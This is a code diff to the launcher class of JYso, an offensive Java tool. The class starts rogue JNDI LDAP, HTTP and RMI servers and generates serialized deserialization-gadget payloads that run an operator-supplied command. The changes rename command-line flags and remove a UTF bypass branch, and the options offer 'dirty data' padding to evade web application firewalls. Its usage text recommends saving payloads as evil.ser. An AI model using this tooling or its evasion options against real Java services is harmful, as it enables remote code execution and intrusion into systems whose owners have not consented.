@@ -1,6 +1,5 @@
 package com.qi4l.jndi;
 
-import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.Config.Config;
 import com.qi4l.jndi.gadgets.ObjectPayload;
 import com.qi4l.jndi.gadgets.annotation.Authors;
@@ -10,13 +9,10 @@ import com.qi4l.jndi.gadgets.utils.Strings;
 import com.qi4l.jndi.gadgets.utils.dirty.DirtyDataWrapper;
 import org.apache.commons.cli.*;
 
-
 import java.io.FileOutputStream;
 import java.io.OutputStream;
 import java.util.*;
 
-
-import static com.qi4l.jndi.gadgets.Config.Config.IS_UTF_Bypass;
 import static com.qi4l.jndi.gadgets.utils.HexUtils.generatePassword;
 import static com.qi4l.jndi.gadgets.utils.Strings.isFromExploit;
 
@@ -24,19 +20,21 @@ public class Starter {
 
     public static CommandLine cmdLine;
 
-    public static String JYsoMode = "qi4L";
+    public static boolean JYsoMode = false;
 
     public static Object PAYLOAD = null;
 
     public static void main(String[] args) throws Exception {
-        if (args.length > 0 && args[0].equals("--jndi")) {
+        if (args.length > 0 && args[0].equals("-j")) {
             Config.applyCmdArgs(args);
             LdapServer.start();
             HTTPServer.start();
             RMIServer.start();
         }
-        if (args.length > 0 && args[0].equals("-yso")) {
-            JYsoMode = "yso";
+        if (args.length > 0 && args[0].equals("-y")) {
+
+            JYsoMode = true;
+
             final Options options = getOptions();
 
             CommandLineParser parser = new DefaultParser();
@@ -134,9 +132,8 @@ public class Starter {
 
             final String payloadType  = cmdLine.getOptionValue("gadget");
             final String command      = cmdLine.getOptionValue("parameters");
-            final String payloadType1 = payloadType.toLowerCase();
 
-            final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(payloadType1);
+            final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(payloadType);
             if (payloadClass == null) {
                 System.err.println("Invalid payload type '" + payloadType + "'");
                 printUsage(options);
@@ -147,7 +144,7 @@ public class Starter {
 
             try {
                 ObjectPayload payload = payloadClass.newInstance();
-                Object        object  = payload.getObject(PayloadType.command, command);
+                Object        object  = payload.getObject(command);
 
                 // 是否指定混淆
                 if (cmdLine.hasOption("dirty-type") && cmdLine.hasOption("dirty-length")) {
@@ -170,13 +167,8 @@ public class Starter {
                 } else {
                     out = System.out;
                 }
-                if (IS_UTF_Bypass) {
-                    Serializer.qiserialize4l(object, out);
-                    ObjectPayload.Utils.releasePayload(payload, object);
-                } else {
-                    Serializer.qiserialize(object, out);
-                    ObjectPayload.Utils.releasePayload(payload, object);
-                }
+                Serializer.qiserialize(object, out);
+                ObjectPayload.Utils.releasePayload(payload, object);
                 out.flush();
                 out.close();
             } catch (Throwable e) {
@@ -190,7 +182,7 @@ public class Starter {
 
     private static Options getOptions() {
         Options options = new Options();
-        options.addOption("yso", "ysoserial", true, "Java deserialization");
+        options.addOption("y", "ysoserial", false, "Java deserialization");
         options.addOption("g", "gadget", true, "Java deserialization gadget");
         options.addOption("p", "parameters", true, "Gadget parameters");
         options.addOption("dt", "dirty-type", true, "Using dirty data to bypass WAF，type: 1:Random Hashable Collections/2:LinkedList Nesting/3:TC_RESET in Serialized Data");
@@ -218,7 +210,7 @@ public class Starter {
 
     private static void printUsage(Options options) {
 
-        System.err.println("[root]#~  Usage: java -jar JYso-[version].jar -yso -g [payload] -p [command] [options]");
+        System.err.println("[root]#~  Usage: java -jar JYso-[version].jar -y -g [payload] -p [command] [options]");
         System.err.println("[root]#~  Available payload types:");
 
         final List<Class<? extends ObjectPayload>> payloadClasses =
@@ -248,9 +240,9 @@ public class Starter {
         helpFormatter.printHelp("JYso-[version].jar", options, true);
 
         System.err.println("\r\n");
-        System.err.println("Recommended Usage: -yso -g [payload] -p '[command]' -dt 1 -dl 50000 -o -i -f evil.ser");
+        System.err.println("Recommended Usage: -y -g [payload] -p '[command]' -dt 1 -dl 50000 -o -i -f evil.ser");
         System.err.println("If you want your payload being extremely short，you could just use:");
-        System.err.println("java -jar JYso-[version].jar -yso -g [payload] -p '[command]' -i -f evil.ser");
+        System.err.println("java -jar JYso-[version].jar -y -g [payload] -p '[command]' -i -f evil.ser");
         System.exit(0);
     }
 }
